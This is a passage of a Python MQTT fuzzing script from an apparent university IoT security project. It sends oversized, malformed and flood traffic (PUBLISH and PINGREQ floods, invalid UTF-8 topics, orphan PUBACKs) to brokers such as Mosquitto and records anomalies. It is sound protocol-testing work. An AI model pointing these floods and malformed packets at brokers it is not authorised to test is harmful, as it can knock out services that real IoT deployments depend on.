#!/usr/bin/env python3
"""
Campaign 3 — MQTT Security Fuzzing
UCLA ECE 202C — IoT Security Final Project
Patrick Argento

Goals:
  1. Verification tests for mitigations on all 10 prior vulnerabilities
  2. Discovery of 10 new vulnerabilities in Mosquitto
  3. Cross-broker fuzzing against EMQX, NanoMQ, HiveMQ

This script is self-contained and produces all raw result data for Campaign 3.
"""

import sys
import os
import socket
import struct
import time
import json
import threading
import random
import logging
from typing import Optional, List, Dict, Tuple, Any
from dataclasses import dataclass, field, asdict
from datetime import datetime

# ─────────────────────────────────────────────────────────────
# Logging setup
# ─────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("campaign3")

# ─────────────────────────────────────────────────────────────
# MQTT Packet Construction (raw, no library)
# ─────────────────────────────────────────────────────────────

def encode_remaining_length(length: int) -> bytes:
    """MQTT variable-length integer encoding (§2.2.3)."""
    encoded = bytearray()
    while True:
        byte = length % 128
        length //= 128
        if length > 0:
            byte |= 0x80
        encoded.append(byte)
        if length == 0:
            break
    return bytes(encoded)

def encode_utf8(s) -> bytes:
    """Encode string with 2-byte length prefix (§1.5.3)."""
    if isinstance(s, str):
        b = s.encode("utf-8", errors="replace")
    else:
        b = bytes(s)
    return struct.pack("!H", len(b)) + b

def encode_u16(v: int) -> bytes:
    return struct.pack("!H", v & 0xFFFF)

def build_connect(
    client_id: str = "fuzz_c3",
    clean_session: bool = True,
    keepalive: int = 60,
    username: Optional[str] = None,
    password: Optional[str] = None,
    will_topic: Optional[str] = None,
    will_message: Optional[bytes] = None,
    will_qos: int = 0,
    will_retain: bool = False,
    protocol_level: int = 0x04,
    protocol_name: bytes = b"MQTT",
    raw_payload_suffix: bytes = b"",
) -> bytes:
    """Build MQTT CONNECT with full field control."""
    vh = encode_utf8(protocol_name.decode("latin-1"))
    vh += bytes([protocol_level])
    flags = 0
    if clean_session:
        flags |= 0x02
    if will_topic is not None:
        flags |= 0x04
        flags |= (will_qos & 0x03) << 3
        if will_retain:
            flags |= 0x20
    if password is not None:
        flags |= 0x40
    if username is not None:
        flags |= 0x80
    vh += bytes([flags])
    vh += encode_u16(keepalive)
    payload = encode_utf8(client_id)
    if will_topic is not None:
        payload += encode_utf8(will_topic)
        wm = will_message or b""
        payload += struct.pack("!H", len(wm)) + wm
    if username is not None:
        payload += encode_utf8(username)
    if password is not None:
        payload += encode_utf8(password)
    payload += raw_payload_suffix
    body = vh + payload
    return bytes([0x10]) + encode_remaining_length(len(body)) + body

def build_publish(
    topic: str,
    payload: bytes = b"",
    qos: int = 0,
    retain: bool = False,
    dup: bool = False,
    packet_id: int = 1,
) -> bytes:
    first = 0x30
    if dup: first |= 0x08
    first |= (qos & 0x03) << 1
    if retain: first |= 0x01
    vh = encode_utf8(topic)
    if qos > 0:
        vh += encode_u16(packet_id)
    body = vh + payload
    return bytes([first]) + encode_remaining_length(len(body)) + body

def build_subscribe(topic: str, packet_id: int = 1, qos: int = 0) -> bytes:
    vh = encode_u16(packet_id)
    payload = encode_utf8(topic) + bytes([qos & 0xFF])
    body = vh + payload
    return bytes([0x82]) + encode_remaining_length(len(body)) + body

def build_subscribe_multi(topics: List[Tuple[str, int]], packet_id: int = 1) -> bytes:
    """Subscribe to multiple topics in one packet."""
    vh = encode_u16(packet_id)
    payload = b""
    for topic, qos in topics:
        payload += encode_utf8(topic) + bytes([qos & 0xFF])
    body = vh + payload
    return bytes([0x82]) + encode_remaining_length(len(body)) + body

def build_unsubscribe(topic: str, packet_id: int = 1) -> bytes:
    vh = encode_u16(packet_id)
    payload = encode_utf8(topic)
    body = vh + payload
    return bytes([0xA2]) + encode_remaining_length(len(body)) + body

def build_pubrel(packet_id: int) -> bytes:
    return bytes([0x62, 0x02]) + encode_u16(packet_id)

def build_pubrec(packet_id: int) -> bytes:
    return bytes([0x50, 0x02]) + encode_u16(packet_id)

def build_pubcomp(packet_id: int) -> bytes:
    return bytes([0x70, 0x02]) + encode_u16(packet_id)

def build_puback(packet_id: int) -> bytes:
    return bytes([0x40, 0x02]) + encode_u16(packet_id)

def build_pingreq() -> bytes:
    return bytes([0xC0, 0x00])

def build_disconnect() -> bytes:
    return bytes([0xE0, 0x00])

def build_disconnect_v5(reason_code: int = 0x00) -> bytes:
    """MQTT v5 DISCONNECT with reason code."""
    return bytes([0xE0, 0x02, 0x00, reason_code])

# ─────────────────────────────────────────────────────────────
# Raw TCP Connection
# ─────────────────────────────────────────────────────────────

class RawConn:
    def __init__(self, host: str, port: int, timeout: float = 4.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._sock: Optional[socket.socket] = None

    def connect(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(self.timeout)
            self._sock.connect((self.host, self.port))
            return True
        except Exception:
            self._sock = None
            return False

    def send(self, data: bytes) -> bool:
        if not self._sock:
            return False
        try:
            self._sock.sendall(data)
            return True
        except Exception:
            return False

    def recv(self, bufsize: int = 8192, timeout: Optional[float] = None) -> Optional[bytes]:
        if not self._sock:
            return None
        t = timeout if timeout is not None else self.timeout
        self._sock.settimeout(t)
        try:
            data = self._sock.recv(bufsize)
            return data if data else None
        except socket.timeout:
            return None
        except Exception:
            return None

    def send_recv(self, data: bytes, timeout: float = 3.0) -> Optional[bytes]:
        if not self.send(data):
            return None
        return self.recv(timeout=timeout)

    def close(self):
        if self._sock:
            try: self._sock.close()
            except: pass
            self._sock = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *_):
        self.close()


def parse_connack(data: bytes) -> Tuple[int, int]:
    """Return (session_present, return_code) or (-1, -1) on error."""
    if data and len(data) >= 4 and (data[0] >> 4) == 2:
        return (data[2] & 0x01), data[3]
    return -1, -1

def parse_suback_codes(data: bytes) -> List[int]:
    """Extract SUBACK return codes."""
    if not data or len(data) < 4 or (data[0] >> 4) != 9:
        return []
    remaining = data[1] if data[1] < 128 else (data[1] & 0x7F) + (data[2] << 7)
    offset = 4 if data[1] >= 128 else 4  # skip fixed+remaining+packet_id
    # Simple: skip fixed header (2 bytes) + packet_id (2 bytes)
    try:
        rem_len_bytes = 1 if data[1] < 0x80 else 2
        start = 1 + rem_len_bytes + 2  # fixed_header_byte + rem_len + packet_id
        return list(data[start:])
    except:
        return []

def broker_alive(host: str, port: int) -> bool:
    """Quick liveness check via CONNECT/CONNACK."""
    try:
        with RawConn(host, port, timeout=2.0) as c:
            r = c.send_recv(build_connect("liveness_chk", clean_session=True), timeout=2.0)
            if r:
                sp, rc = parse_connack(r)
                return rc == 0
            return False
    except:
        return False


# ─────────────────────────────────────────────────────────────
# Test Result Data Model
# ─────────────────────────────────────────────────────────────

@dataclass
class TestResult:
    test_id: str
    category: str
    description: str
    host: str
    port: int
    broker_label: str
    packets_sent: int = 0
    response_raw: str = ""
    connack_rc: int = -1
    session_present: bool = False
    suback_codes: List[int] = field(default_factory=list)
    anomaly: bool = False
    anomaly_type: str = ""
    anomaly_detail: str = ""
    broker_alive_after: bool = True
    duration_ms: float = 0.0
    raw_responses: List[str] = field(default_factory=list)
    notes: str = ""

    def to_dict(self) -> dict:
        d = asdict(self)
        return d


# ─────────────────────────────────────────────────────────────
# Campaign 3 — Goal 2: New Vulnerability Tests
# ─────────────────────────────────────────────────────────────

class Campaign3Fuzzer:
    """Runs all new vulnerability tests against a target broker."""

    def __init__(self, host: str = "localhost", port: int = 1883, broker_label: str = "mosquitto"):
        self.host = host
        self.port = port
        self.label = broker_label
        self.results: List[TestResult] = []

    def _result(self, test_id: str, category: str, description: str) -> TestResult:
        return TestResult(
            test_id=test_id,
            category=category,
            description=description,
            host=self.host,
            port=self.port,
            broker_label=self.label,
        )

    def _quick_connect(self, client_id: str = "fuzz_c3", clean: bool = True,
                       keepalive: int = 60, **kwargs) -> Tuple[Optional[bytes], RawConn]:
        """Open connection, send CONNECT, return (connack_bytes, conn)."""
        c = RawConn(self.host, self.port, timeout=4.0)
        if not c.connect():
            return None, c
        pkt = build_connect(client_id=client_id, clean_session=clean,
                            keepalive=keepalive, **kwargs)
        r = c.send_recv(pkt, timeout=3.0)
        return r, c

    # ── V18: CONNECT Max Fields Simultaneously ──────────────────────────
    def test_v18_max_connect_fields(self) -> TestResult:
        """
        V18: CONNECT with all fields at maximum — ClientID=23 chars,
        username/password at 65535 bytes each, will with QoS2+retain,
        will_topic and will_message at large sizes.
        Tests resource exhaustion at CONNECT parsing time.
        """
        res = self._result("V18_MAX_CONNECT_FIELDS", "RESOURCE_EXHAUSTION",
                           "CONNECT with all fields maximally populated")
        t0 = time.time()
        client_id = "A" * 23
        username = "U" * 65535
        password = "P" * 65535
        will_topic = "will/" + "w" * 100
        will_message = b"W" * 10000
        try:
            c = RawConn(self.host, self.port, timeout=8.0)
            if not c.connect():
                res.anomaly = True
                res.anomaly_type = "CONNECTION_FAILED"
                return res
            pkt = build_connect(
                client_id=client_id,
                clean_session=True,
                keepalive=60,
                username=username,
                password=password,
                will_topic=will_topic,
                will_message=will_message,
                will_qos=2,
                will_retain=True,
            )
            res.packets_sent = 1
            r = c.send_recv(pkt, timeout=6.0)
            c.close()
            if r:
                sp, rc = parse_connack(r)
                res.connack_rc = rc
                res.session_present = bool(sp)
                res.response_raw = r.hex()[:80]
                if rc == 0:
                    res.anomaly = True
                    res.anomaly_type = "ACCEPTED_OVERSIZED_FIELDS"
                    res.anomaly_detail = (
                        "Broker accepted CONNECT with 65535-byte username and password "
                        "plus 10KB will message — no resource limits enforced"
                    )
                else:
                    res.notes = f"Broker rejected oversized CONNECT with RC={rc:#04x}"
            else:
                res.anomaly = True
                res.anomaly_type = "NO_RESPONSE_OVERSIZED_CONNECT"
                res.anomaly_detail = "Broker gave no CONNACK to oversized CONNECT — possible DoS or parsing failure"
            res.broker_alive_after = broker_alive(self.host, self.port)
        except Exception as e:
            res.anomaly = True
            res.anomaly_type = "EXCEPTION"
            res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V19: SUBSCRIBE with 65535 topic filters ─────────────────────────
    def test_v19_subscribe_flood_topics(self) -> TestResult:
        """
        V19: SUBSCRIBE packet with a large number of topic filters.
        Tests broker enforcement of subscription limits.
        MQTT spec does not mandate a limit, but brokers must handle gracefully.
        """
        res = self._result("V19_SUBSCRIBE_TOPIC_FLOOD", "RESOURCE_EXHAUSTION",
                           "SUBSCRIBE with 500 topic filters in one packet")
        t0 = time.time()
        try:
            r, c = self._quick_connect("sub_flood_c3", clean=True)
            if not r:
                res.anomaly = True
                res.anomaly_type = "CONNECT_FAILED"
                c.close()
                return res
            sp, rc = parse_connack(r)
            res.connack_rc = rc
            if rc != 0:
                c.close()
                res.notes = f"CONNECT rejected RC={rc}"
                return res
            # Build SUBSCRIBE with 500 topics
            topics = [(f"fuzz/topic/{i:05d}", 0) for i in range(500)]
            sub_pkt = build_subscribe_multi(topics, packet_id=2)
            res.packets_sent = 2
            c.send(sub_pkt)
            r2 = c.recv(bufsize=16384, timeout=5.0)
            c.close()
            if r2:
                codes = parse_suback_codes(r2)
                res.suback_codes = codes[:20]  # first 20 for log
                res.response_raw = r2.hex()[:80]
                failure_codes = [x for x in codes if x == 0x80]
                if len(codes) == 500:
                    res.anomaly = True
                    res.anomaly_type = "GRANTED_500_SUBSCRIPTIONS"
                    res.anomaly_detail = (
                        f"Broker granted all 500 subscriptions in one packet. "
                        f"Failures: {len(failure_codes)}/500. "
                        "No per-client subscription limit enforced."
                    )
                elif len(codes) == 0:
                    res.notes = "SUBACK received but could not parse codes"
                else:
                    res.notes = f"Partial SUBACK: {len(codes)} codes returned"
            else:
                res.anomaly = True
                res.anomaly_type = "NO_SUBACK_500_TOPICS"
                res.anomaly_detail = "No SUBACK after 500-topic SUBSCRIBE — broker may have dropped connection"
            res.broker_alive_after = broker_alive(self.host, self.port)
        except Exception as e:
            res.anomaly = True
            res.anomaly_type = "EXCEPTION"
            res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V20: PUBLISH flood — rate limit testing ──────────────────────────
    def test_v20_publish_flood(self) -> TestResult:
        """
        V20: Send 1000 QoS 0 PUBLISH packets at maximum rate.
        Measures if broker imposes per-connection publish rate limits.
        """
        res = self._result("V20_PUBLISH_FLOOD", "DENIAL_OF_SERVICE",
                           "1000 QoS0 PUBLISH at maximum rate — rate limit check")
        t0 = time.time()
        try:
            r, c = self._quick_connect("pub_flood_c3", clean=True)
            if not r:
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; c.close(); return res
            sp, rc = parse_connack(r)
            if rc != 0:
                c.close(); res.notes = f"CONNECT rejected RC={rc}"; return res
            pkt = build_publish("fuzz/flood", b"x" * 100, qos=0)
            sent = 0
            t_start = time.time()
            for _ in range(1000):
                if not c.send(pkt):
                    break
                sent += 1
            t_end = time.time()
            res.packets_sent = sent + 1
            rate = sent / max(t_end - t_start, 0.001)
            c.close()
            res.broker_alive_after = broker_alive(self.host, self.port)
            res.notes = f"Sent {sent} PUBLISH in {(t_end-t_start)*1000:.0f}ms = {rate:.0f} msgs/sec"
            if res.broker_alive_after and sent == 1000:
                res.anomaly = True
                res.anomaly_type = "NO_PUBLISH_RATE_LIMIT"
                res.anomaly_detail = (
                    f"Broker accepted {sent} PUBLISH at {rate:.0f} msg/sec without rate limiting. "
                    "No per-connection publish quota enforced."
                )
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V21: PINGREQ flood — keepalive abuse ─────────────────────────────
    def test_v21_pingreq_flood(self) -> TestResult:
        """
        V21: Send 200 PINGREQ without any data traffic.
        Tests whether broker enforces keep-alive semantics (client should send data).
        """
        res = self._result("V21_PINGREQ_FLOOD", "DENIAL_OF_SERVICE",
                           "200 PINGREQ to hold connection without real traffic")
        t0 = time.time()
        try:
            r, c = self._quick_connect("ping_flood_c3", clean=True, keepalive=60)
            if not r:
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; c.close(); return res
            sp, rc = parse_connack(r)
            if rc != 0:
                c.close(); res.notes = f"CONNECT rejected RC={rc}"; return res
            pkt = build_pingreq()
            responses = 0
            res.packets_sent = 1
            for _ in range(200):
                c.send(pkt)
                res.packets_sent += 1
                r2 = c.recv(timeout=0.5)
                if r2 and len(r2) >= 2 and (r2[0] >> 4) == 13:  # PINGRESP
                    responses += 1
            c.close()
            res.broker_alive_after = broker_alive(self.host, self.port)
            res.notes = f"Got {responses}/200 PINGRESPs"
            if responses >= 150:
                res.anomaly = True
                res.anomaly_type = "PINGREQ_FLOOD_ACCEPTED"
                res.anomaly_detail = (
                    f"Broker responded to {responses}/200 PINGREQs without any data traffic. "
                    "Keep-alive abuse allows connection maintenance without meaningful traffic. "
                    "No PINGREQ rate limiting detected."
                )
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V22: QoS downgrade — subscribe QoS2, publish QoS0 ───────────────
    def test_v22_qos_downgrade(self) -> TestResult:
        """
        V22: Subscribe at QoS 2, publisher sends at QoS 0.
        MQTT spec §4.3 states delivery is at min(subscribe_qos, publish_qos).
        Tests if downgrade is silent and whether the subscriber is notified.
        """
        res = self._result("V22_QOS_DOWNGRADE", "SEMANTIC_VIOLATION",
                           "Subscribe QoS2, publisher sends QoS0 — silent downgrade check")
        t0 = time.time()
        received_qos = -1
        try:
            # Subscriber connection
            sub_conn = RawConn(self.host, self.port, timeout=5.0)
            if not sub_conn.connect():
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; return res
            r = sub_conn.send_recv(build_connect("sub_qos_dn", clean_session=True), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                sub_conn.close(); res.notes = "subscriber CONNECT failed"; return res
            sub_conn.send(build_subscribe("fuzz/qos_dn", packet_id=1, qos=2))
            r2 = sub_conn.recv(timeout=2.0)  # SUBACK
            res.packets_sent = 3

            # Publisher connection
            pub_conn = RawConn(self.host, self.port, timeout=5.0)
            pub_conn.connect()
            pub_conn.send_recv(build_connect("pub_qos_dn", clean_session=True), timeout=2.0)
            pub_conn.send(build_publish("fuzz/qos_dn", b"qos_downgrade_test", qos=0))
            pub_conn.close()
            res.packets_sent += 2

            # Check subscriber received
            r3 = sub_conn.recv(timeout=2.0)
            sub_conn.close()
            if r3:
                pkt_type = (r3[0] >> 4) & 0x0F
                if pkt_type == 3:  # PUBLISH
                    received_qos = (r3[0] >> 1) & 0x03
                    res.notes = f"Subscriber received PUBLISH with QoS={received_qos}"
                    res.anomaly = True
                    res.anomaly_type = "SILENT_QOS_DOWNGRADE"
                    res.anomaly_detail = (
                        f"Subscriber requested QoS 2 but received message at QoS {received_qos}. "
                        "QoS downgrade occurs silently — subscriber has no notification that "
                        "delivery guarantees are reduced. This can be a reliability/trust violation "
                        "in systems that assume QoS 2 delivery semantics."
                    )
            res.broker_alive_after = broker_alive(self.host, self.port)
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V23: DISCONNECT with v5 non-zero reason code to v3 broker ────────
    def test_v23_v5_disconnect_to_v3_broker(self) -> TestResult:
        """
        V23: Send MQTT v5 DISCONNECT (with reason code byte) to a v3.1.1 broker.
        MQTT v3.1.1 DISCONNECT has 0 remaining length. Sending reason code byte
        creates a malformed DISCONNECT that brokers must handle gracefully.
        """
        res = self._result("V23_V5_DISCONNECT_TO_V3", "PROTOCOL_CONFUSION",
                           "MQTT v5 DISCONNECT (with reason code) sent to v3.1.1 broker")
        t0 = time.time()
        try:
            r, c = self._quick_connect("disc_v5_c3", clean=True)
            if not r:
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; c.close(); return res
            sp, rc = parse_connack(r)
            res.connack_rc = rc
            if rc != 0:
                c.close(); res.notes = f"CONNECT rejected RC={rc}"; return res
            # Send v5-style DISCONNECT with reason code 0x04 (disconnect with will)
            c.send(build_disconnect_v5(reason_code=0x04))
            res.packets_sent = 2
            r2 = c.recv(timeout=2.0)
            if r2:
                res.response_raw = r2.hex()
                res.anomaly = True
                res.anomaly_type = "UNEXPECTED_RESPONSE_TO_DISCONNECT"
                res.anomaly_detail = f"Broker responded to DISCONNECT packet: {r2.hex()}"
            else:
                # Normal: broker just closes connection — but does it process it correctly?
                # Now reconnect to verify broker is still alive
                res.broker_alive_after = broker_alive(self.host, self.port)
                if res.broker_alive_after:
                    res.notes = "Broker silently accepted v5 DISCONNECT and remains alive (best case)"
                else:
                    res.anomaly = True
                    res.anomaly_type = "CRASH_ON_V5_DISCONNECT"
                    res.anomaly_detail = "Broker crashed after receiving MQTT v5 DISCONNECT"
            c.close()
            res.broker_alive_after = broker_alive(self.host, self.port)
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V24: Overlapping subscriptions — message multiplication ──────────
    def test_v24_overlapping_subscriptions(self) -> TestResult:
        """
        V24: Subscribe to a/b, a/+, and # simultaneously.
        MQTT spec §3.3.5 allows broker to deliver multiple copies.
        Test if message multiplication enables amplification attacks.
        """
        res = self._result("V24_OVERLAPPING_SUBSCRIPTIONS", "SEMANTIC_VIOLATION",
                           "Subscribe to a/b, a/+, # simultaneously — message multiplication")
        t0 = time.time()
        try:
            sub_conn = RawConn(self.host, self.port, timeout=5.0)
            if not sub_conn.connect():
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; return res
            r = sub_conn.send_recv(build_connect("overlap_sub_c3", clean_session=True), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                sub_conn.close(); res.notes = "CONNECT failed"; return res
            # Subscribe to 3 overlapping filters
            sub_conn.send(build_subscribe("a/b", packet_id=1, qos=0))
            sub_conn.recv(timeout=1.0)  # SUBACK 1
            sub_conn.send(build_subscribe("a/+", packet_id=2, qos=0))
            sub_conn.recv(timeout=1.0)  # SUBACK 2
            sub_conn.send(build_subscribe("#", packet_id=3, qos=0))
            sub_conn.recv(timeout=1.0)  # SUBACK 3
            res.packets_sent = 4

            # Publisher
            pub_conn = RawConn(self.host, self.port, timeout=5.0)
            pub_conn.connect()
            pub_conn.send_recv(build_connect("overlap_pub_c3", clean_session=True), timeout=2.0)
            pub_conn.send(build_publish("a/b", b"overlap_msg", qos=0))
            pub_conn.close()
            res.packets_sent += 2

            # Collect received messages (wait up to 2s)
            received = []
            deadline = time.time() + 2.0
            sub_conn._sock.settimeout(0.3)
            while time.time() < deadline:
                try:
                    chunk = sub_conn._sock.recv(4096)
                    if chunk:
                        received.append(chunk)
                except:
                    break
            sub_conn.close()

            copies = len(received)
            res.notes = f"Received {copies} message copies for 1 published message"
            if copies >= 2:
                res.anomaly = True
                res.anomaly_type = "MESSAGE_MULTIPLICATION"
                res.anomaly_detail = (
                    f"Broker delivered {copies} copies of 1 message due to overlapping subscriptions "
                    f"(a/b, a/+, #). While spec-compliant (§3.3.5), this enables bandwidth amplification: "
                    f"1 PUBLISH → {copies}x deliveries to a single subscriber. "
                    "A single attacker client can amplify their own traffic by {copies}x."
                )
            res.broker_alive_after = broker_alive(self.host, self.port)
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V25: Orphan PUBACK ────────────────────────────────────────────────
    def test_v25_orphan_puback(self) -> TestResult:
        """
        V25: Send PUBACK for a packet ID the broker never sent.
        The broker should ignore this gracefully.
        Tests for state machine confusion or assertion failures.
        """
        res = self._result("V25_ORPHAN_PUBACK", "PROTOCOL_STATE_MACHINE",
                           "PUBACK for unrequested packet ID — state machine confusion")
        t0 = time.time()
        try:
            r, c = self._quick_connect("orphan_pub_c3", clean=True)
            if not r:
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; c.close(); return res
            sp, rc = parse_connack(r)
            res.connack_rc = rc
            if rc != 0:
                c.close(); res.notes = f"CONNECT rejected RC={rc}"; return res
            # Send 50 phantom PUBACKs for PIDs the broker never allocated
            for pid in [1, 100, 1000, 32767, 65535, 0]:
                c.send(build_puback(pid))
            res.packets_sent = 1 + 6
            r2 = c.recv(timeout=2.0)
            c.close()
            res.broker_alive_after = broker_alive(self.host, self.port)
            if not res.broker_alive_after:
                res.anomaly = True
                res.anomaly_type = "CRASH_ON_ORPHAN_PUBACK"
                res.anomaly_detail = "Broker crashed after receiving orphan PUBACKs"
            elif r2:
                res.response_raw = r2.hex()[:40]
                res.notes = f"Broker sent unexpected response to orphan PUBACKs: {r2.hex()[:40]}"
                res.anomaly = True
                res.anomaly_type = "RESPONSE_TO_ORPHAN_PUBACK"
                res.anomaly_detail = "Broker responded to phantom PUBACK packets — unexpected"
            else:
                res.notes = "Broker silently tolerated 6 orphan PUBACKs (expected benign behavior)"
                # Flag as informational — this is the V10 pattern
                res.anomaly = True
                res.anomaly_type = "ORPHAN_PUBACK_TOLERATED"
                res.anomaly_detail = (
                    "Broker silently accepts PUBACK for packet IDs it never sent. "
                    "While not immediately exploitable, this indicates absence of strict "
                    "QoS state validation — supports the V10 finding with additional coverage."
                )
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V26: Invalid UTF-8 in topic name ─────────────────────────────────
    def test_v26_invalid_utf8_topics(self) -> TestResult:
        """
        V26: PUBLISH and SUBSCRIBE with invalid UTF-8 byte sequences in topic names.
        MQTT spec §1.5.3 requires all strings be valid UTF-8.
        Tests if broker validates encoding or allows injection.
        """
        res = self._result("V26_INVALID_UTF8_TOPICS", "INPUT_VALIDATION",
                           "PUBLISH/SUBSCRIBE with invalid UTF-8 topic names")
        t0 = time.time()
        invalid_utf8_sequences = [
            b"\xff\xfe",          # BOM/invalid continuation
            b"\x80\x80",          # Continuation bytes without start
            b"\xc0\xaf",          # Overlong encoding of '/'
            b"\xed\xa0\x80",      # Surrogate half (U+D800)
            b"\xf8\x80\x80\x80\x80",  # 5-byte sequence (invalid in UTF-8)
            b"valid/\xfe\xff/end", # Invalid in middle
            b"\x00topic",          # Null byte in topic
            b"topic\x00end",       # Null byte embedded
        ]
        anomalies_found = 0
        details = []
        try:
            for seq in invalid_utf8_sequences:
                # Build raw PUBLISH with invalid topic bytes directly
                topic_raw = seq
                vh = struct.pack("!H", len(topic_raw)) + topic_raw
                body = vh + b"test_payload"
                pkt_publish = bytes([0x30]) + encode_remaining_length(len(body)) + body

                c = RawConn(self.host, self.port, timeout=3.0)
                if not c.connect():
                    continue
                r_conn = c.send_recv(build_connect("utf8_c3", clean_session=True), timeout=2.0)
                if not r_conn or parse_connack(r_conn)[1] != 0:
                    c.close(); continue
                c.send(pkt_publish)
                r2 = c.recv(timeout=1.5)
                still_alive = broker_alive(self.host, self.port)
                c.close()

                seq_hex = seq.hex()[:20]
                if not still_alive:
                    anomalies_found += 1
                    details.append(f"CRASH on topic bytes {seq_hex}")
                elif r2:
                    # Unexpected response to QoS 0 PUBLISH
                    pkt_type = (r2[0] >> 4) if r2 else 0
                    if pkt_type != 3:  # Not another PUBLISH (which might be echo)
                        details.append(f"Unexpected response {r2.hex()[:20]} to invalid UTF-8 topic {seq_hex}")
                else:
                    details.append(f"Silent accept (no response, alive) for {seq_hex}")

            res.packets_sent = len(invalid_utf8_sequences) * 2
            res.broker_alive_after = broker_alive(self.host, self.port)

            if any("CRASH" in d for d in details):
                res.anomaly = True
                res.anomaly_type = "CRASH_ON_INVALID_UTF8"
                res.anomaly_detail = "; ".join(details)
            elif all("Silent accept" in d for d in details):
                res.anomaly = True
                res.anomaly_type = "INVALID_UTF8_ACCEPTED_IN_TOPICS"
                res.anomaly_detail = (
                    "Broker silently accepts PUBLISH with invalid UTF-8 byte sequences in topic names. "
                    "Per MQTT §1.5.3, brokers SHOULD reject packets with invalid UTF-8. "
                    "Accepting invalid UTF-8 enables topic namespace injection and may cause "
                    "unexpected behavior in subscribers that validate topic encoding.\n"
                    "Sequences tested: " + ", ".join(seq.hex()[:12] for seq in invalid_utf8_sequences)
                )
            else:
                res.notes = "Mixed results: " + "; ".join(details[:4])
                res.anomaly = True
                res.anomaly_type = "PARTIAL_UTF8_VALIDATION"
                res.anomaly_detail = "\n".join(details)

        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V27: Keep-alive timeout enforcement ──────────────────────────────
    def test_v27_keepalive_timeout_enforcement(self) -> TestResult:
        """
        V27: Connect with keepalive=2 seconds, then wait 5 seconds without
        sending any packet. Broker MUST disconnect client within 1.5 * keepalive.
        Tests if broker enforces §3.1.2.10 keep-alive obligation.
        """
        res = self._result("V27_KEEPALIVE_ENFORCEMENT", "PROTOCOL_COMPLIANCE",
                           "Keep-alive=2s, wait 5s — broker must disconnect per §3.1.2.10")
        t0 = time.time()
        try:
            c = RawConn(self.host, self.port, timeout=10.0)
            if not c.connect():
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; return res
            r = c.send_recv(build_connect("ka_test_c3", clean_session=True, keepalive=2), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; return res
            res.packets_sent = 1
            # Wait 5 seconds (2.5 * keepalive_interval) — broker MUST disconnect us
            t_wait = time.time()
            disconnect_received = False
            c._sock.settimeout(5.5)
            try:
                data = c._sock.recv(4096)
                if data:
                    pkt_type = (data[0] >> 4) if data else 0
                    if pkt_type == 14:  # DISCONNECT
                        disconnect_received = True
                        res.notes = "Broker sent DISCONNECT — correct keepalive enforcement"
                    else:
                        res.notes = f"Received unexpected packet type {pkt_type} during keepalive wait"
                else:
                    # TCP connection closed by broker — correct behavior
                    disconnect_received = True
                    res.notes = "Broker closed TCP connection — correct keepalive enforcement"
            except socket.timeout:
                # Broker did NOT disconnect us — violation
                pass
            c.close()
            elapsed = time.time() - t_wait
            res.broker_alive_after = broker_alive(self.host, self.port)
            if not disconnect_received:
                res.anomaly = True
                res.anomaly_type = "KEEPALIVE_NOT_ENFORCED"
                res.anomaly_detail = (
                    f"Broker did not disconnect client after {elapsed:.1f}s of inactivity "
                    f"with keepalive=2s (should have disconnected within 3s per §3.1.2.10). "
                    "Zombie connections can accumulate, enabling slow connection exhaustion attacks."
                )
            else:
                res.notes += f" (after {elapsed:.2f}s)"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V28: Will message self-delivery ──────────────────────────────────
    def test_v28_will_self_delivery(self) -> TestResult:
        """
        V28: Client sets Will topic to a topic it is also subscribed to.
        When client disconnects ungracefully, does it receive its own Will?
        (Spec does not forbid this — tests for confused state handling.)
        """
        res = self._result("V28_WILL_SELF_DELIVERY", "SEMANTIC_VIOLATION",
                           "Will message targets own subscribed topic — self-delivery check")
        t0 = time.time()
        will_topic = "fuzz/self_will_c3"
        try:
            # Client A: subscribes to will_topic and sets Will on same topic
            client_conn = RawConn(self.host, self.port, timeout=5.0)
            if not client_conn.connect():
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; return res
            r = client_conn.send_recv(
                build_connect(
